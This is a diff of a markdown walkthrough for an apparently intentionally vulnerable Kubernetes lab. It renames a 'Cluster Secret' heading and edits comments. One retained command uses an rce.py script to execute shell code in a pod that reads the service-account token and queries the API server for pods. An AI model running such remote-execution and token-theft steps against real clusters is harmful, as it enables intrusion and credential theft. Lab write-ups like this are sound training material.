@@ -6,7 +6,7 @@
   - [Capture Jewels](#capture-jewels)
     - [Pod Secret](#pod-secret)
     - [SA token](#sa-token)
-    - [Cluster Secret (RBAC pivot)](#cluster-secret-rbac-pivot)
+    - [Cluster Secret](#cluster-secret)
   - [Attack Chain Summary](#attack-chain-summary)
   - [Hardening (later phases)](#hardening-later-phases)
 
@@ -86,13 +86,13 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
 # }
 
 python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
-# executable response: 200 — frontend SA CAN list pods in vuln ns.
-# (The full recon/pivot to the cluster flag continues in "Cluster Secret (RBAC pivot)" below.)
+# list all pods
+
 ```
 
 ---
 
-### Cluster Secret (RBAC pivot)
+### Cluster Secret
 
 The pod now runs as the `frontend` SA (not `default`). That token **cannot** read
 the db-namespace secret directly, but it **can** enumerate pods and exec into them.
